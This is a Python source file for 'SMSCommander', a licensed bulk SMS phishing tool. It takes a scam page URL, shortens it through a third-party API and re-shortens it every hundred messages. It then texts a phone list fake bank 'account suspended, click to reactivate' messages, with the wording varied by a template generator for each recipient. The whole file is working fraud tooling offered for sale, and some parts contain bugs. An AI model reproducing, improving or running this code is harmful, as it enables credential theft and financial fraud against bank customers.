import os
from pyexpat.errors import messages
import time
import requests
import re
import random
import bs4
import json
import datetime
def die(msg, timer):
   print (msg)
   time.sleep(timer)
   exit()
def tutorial():
 try: 
   isFirstTime = ('smscommander/isf.txt')
   os.remove('smscommander/isf.txt')
 except:
     isFirstTime = '0'
 if isFirstTime != '0':
     print('''
     It looks like it is the first time for you to use this version from SMSCommander.
     Do you want to see a quick tutorial of how to use? 
     1) Yes
     2) No, I know how to use it
     ''')
     tutorialOption = input('Input option number: ')
     if tutorialOption == '2':
        return   
def preChecks():
   with open('smscommander/config.json', 'r') as f:
    config_data = json.load(f)
    license_key = config_data['licensekey']
   print("Checking your license..")
   url = f"https://store.cloudjet.org/api/smscommander/api.php?action=checkLicense&license={license_key}"
   response = requests.get(url)
   json_data = response.json()
   if json_data["status"] == 'failed':
      error = json_data["error"]
      die("An error occured while checking your SMSCommander license, error: "+error, 7)
   elif json_data["status"] == "success":
      credit = json_data["credit"]
      print("License check passed, remaining SMS credits: "+credit)
      time.sleep(2)
      return [credit]
def gg(type, platformName, url):
   welcomeWords = ["Dear Sir/Madam", "To whom it may concern", "Dear valued customer", "Good day", "Hello"]
   class accountSuspended:
    accountSuspended = [
    "we regret to inform you that your "+platformName+" banking account has been temporarily suspended.",
    "your "+platformName+" account has been suspended due to suspicious activity.",
    "we have suspended your "+platformName+" account as a precautionary measure.",
    "your "+platformName+" account has been suspended pending further investigation.",
    "we are writing to inform you that we have temporarily suspended your "+platformName+" account.",
    "we have taken the decision to suspend your "+platformName+" account in order to protect your security.",
    "your "+platformName+" account has been blocked due to a breach of our terms and conditions.",
    "we have suspended your "+platformName+" account until we can confirm your identity and verify your "+platformName+" account information.",
    "we regret any inconvenience this may cause, but we take the security of our customers very seriously.",
    "your "+platformName+" account has been suspended in accordance with our internal policies and procedures.",
    "we are writing to inform you that your "+platformName+" account has been temporarily suspended due to security concerns.",
    "your "+platformName+" account has been suspended in order to protect you and our other customers from potential fraud.",
    "we regret to inform you that we have had to temporarily suspend your "+platformName+" account due to suspicious activity.",
    "your "+platformName+" account has been suspended as a precautionary measure, pending further investigation.",
    "we have temporarily suspended your "+platformName+" account until we can confirm your identity and verify your "+platformName+" account information.",
    "your "+platformName+" account has been temporarily blocked due to a breach of our security protocols.",
    "we have suspended your "+platformName+" account to prevent unauthorized access and protect your personal information.",
    "we have taken the decision to suspend your "+platformName+" account in order to ensure the safety and security of your funds.",
    "your "+platformName+" account has been suspended in accordance with our policies and procedures for security purposes.",
    "we have suspended your "+platformName+" account temporarily, and we will contact you as soon as possible to discuss the situation and resolve the issue."]
    reactivateWords = [
    "To reactivate your account, please click on the following link and follow the instructions provided: ",
    "We would like to inform you that your account can now be reactivated by visiting the following link: ",
    "To start the account reactivation process, please access the following link and follow the prompts: ",
    "You can now start the account reactivation process by clicking on the following link and following the provided instructions: ",
    "To regain access to your account, please go to the following link and complete the reactivation process: ",
    "Please follow the link provided to reactivate your account and restore full access to your funds: ",
    ]
    fullMessage = random.choice(welcomeWords)+", "+random.choice(accountSuspended)+" "+random.choice(reactivateWords)+url
   if type == 1:
      return accountSuspended().fullMessage
################END OF GENERIC GENERATE##################
def messageCheck(msg):     
     print("Checking your message..")
     url_regex = re.compile(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+') 
     url_match = url_regex.search(msg)  
     if url_match:
         die("Don't put URLs on your message.", 5)
     else:
        print("Message passed checks.")
def messageSerializer(msg, url):
  print("Serializing your message..")
  preparedMessage = msg.replace("[url]", url)
  print("Message serialized, and will look like: "+preparedMessage)
  print('''Is that ok for you?
  1) Yes
  2) No (will abort the sendout)''')
  accepted = input('Input option number: ')
  if accepted == '1':
     return preparedMessage
  else:
     die("Aborted by user.", 3)
def shortenUrl(url):
   with open('smscommander/config.json', 'r') as f:
    config_data = json.load(f)
    apikey = config_data['apikey']
   print("Shortening your url..")
   url = f"https://store.cloudjet.org/api/shortener/shorten.php?apikey={apikey}&url={url}"
   response = requests.get(url)
   json_data = response.json()
   if json_data["status"] == 'failed':
      error = json_data["error"]
      die("An error occured while shortening your url, error: "+error, 7)
   elif json_data["status"] == "success":
      print("Your url has been shortened successfully.")
      shortenedUrl = json_data["shortenedurl"]
      return shortenedUrl
def send(message, url, ggoption, ggtype, platformName):
   with open('smscommander/config.json', 'r') as f:
    config_data = json.load(f)
    license_key = config_data['licensekey']
    
   if ggoption == 0:
      list_filename = "smscommander/list.txt"
  
      numbers = []
      with open(list_filename, "r") as file:
          for line in file:
              numbers.append(int(line.strip()))  # convert each line to an integer and append to list
      
      failed_numbers = []

      for i, number in enumerate(numbers):
   
            message = messageSerializer(message, url)
            url = f"https://store.cloudjet.org/api/smscommander/api.php?action=send&number={number}&message={message}&licensekey={license_key}"
            response = requests.get(url)
            json_data = response.json()
            if json_data["status"] == 'success':  
              print("SENT => "+str(number)+" | MESSAGE => "+str(message)+" | ~THANKS TO CLOUDJET.ORG")
              time.sleep(3)
              if (i+1) % 100 == 0:
                  print("Re-shortening your url..")
                  url = shortenUrl(url)
                  print("Your url has been re-shortened, sending will continue.")
            else:
               error = json_data["error"]
               print("FAILED => "+str(number)+" | ERROR=> "+error)
               failed_numbers.append(number)
      print('''
            Total numbers: '''+i+'''
            Failed: '''+len(failed_numbers)+'''
            Succeeded: '''+i-len(failed_numbers)+'''
            All failed numbers has been saved in a file in smscommander/fails folder for your safety.
            ''')
      if failed_numbers:
          now = datetime.datetime.now()
          filename = f"smscommander/fails/failed-{now.strftime('%Y-%m-%d-%H-%M-%S')}.txt"
          with open(filename, "w") as file:
              file.write("\n".join(str(number) for number in failed_numbers))
   else:

      list_filename = "smscommander/list.txt"
  
      numbers = []
      with open(list_filename, "r") as file:
          for line in file:
              numbers.append(int(line.strip()))  # convert each line to an integer and append to list
      
      failed_numbers = []
      i = 0
      for i, number in enumerate(numbers):
            if i == 0:
               url = shortenUrl(url)
            message = gg(ggtype, platformName, url)
            urlr = f"https://store.cloudjet.org/api/smscommander/api.php?action=send&number={number}&message={message}&licensekey={license_key}"
            response = requests.get(urlr)
            json_data = response.json()
            if json_data["status"] == 'success':  
              print("SENT => "+str(number)+" | MESSAGE => "+str(message)+" | ~THANKS TO CLOUDJET.ORG")
              time.sleep(3)
              if (i+1) % 100 == 0:
                  print("Re-shortening your url..")
                  url = shortenUrl(url)
                  print("Your url has been re-shortened, sending will continue.")
            else:
               error = json_data["error"]
               print("FAILED => "+str(number)+" | ERROR=> "+error+" | ~THANKS TO CLOUDJET.ORG")
               failed_numbers.append(number)
      print('''
            Total numbers: '''+str(i+1)+'''
            Failed: '''+str(len(failed_numbers))+'''
            Succeeded: '''+str(i-len(failed_numbers))+'''
            All failed numbers has been saved in a file in smscommander/fails folder for your safety.
            ''')
      if failed_numbers:
          now = datetime.datetime.now()
          filename = f"smscommander/fails/failed-{now.strftime('%Y-%m-%d-%H-%M-%S')}.txt"
          with open(filename, "w") as file:
              file.write("\n".join(str(number) for number in failed_numbers))
print('''


   _____ __  ________    ______                                          __         
  / ___//  |/  / ___/   / ____/___  ____ ___  ____ ___  ____ _____  ____/ /__  _____
  \__ \/ /|_/ /\__ \   / /   / __ \/ __ `__ \/ __ `__ \/ __ `/ __ \/ __  / _ \/ ___/
 ___/ / /  / /___/ /  / /___/ /_/ / / / / / / / / / / / /_/ / / / / /_/ /  __/ /    
/____/_/  /_//____/   \____/\____/_/ /_/ /_/_/ /_/ /_/\__,_/_/ /_/\__,_/\___/_/     
                                                                                    
-------------------------------BY CLOUDJET.ORG------------------------------------
VERSION: 1.0
''')
preChecks()
tutorial()
url = input('Input your scampage url (Do NOT short it): ')
print('''
Do you want to use Generic-Generate® feature? 
1) Yes
2) No, I want to type my message manually
3) What is it?
''')
ggoption = input('Input option number: ')
if(ggoption == '3'):
   print('''
    With Generic-Generate® feature, your message will be generated separately for each number using alternative words for each one, we use AI large datasets to give the best accurate formal message 
    in the same time of giving unique words for each message.
    ''')
   die('', 0)
elif(ggoption == '2'):
   print('''
   Message guide: Input your message without any urls, put "[url]" instead of your url.
   Example: Your account has been suspended, please follow the next link: [url]
   ''')
   message = input('Input your message: ')
   
   send(message, url, 0, 0, 0)
else:
   print('''
   With Generic-Generate® feature, your message will be generated separately for each number using alternative words for each one.
   ''')
   print('''
   Choose your message type:
   1) Bank account suspended, re-activation required.
   ~More types coming soon~
   ''')
   type = input('Input your message type: ')
   if type == '1':
      platformName = input('Input the bank name (ex: chase, wells fargo): ')
      send(0, url, 1, 1, platformName)
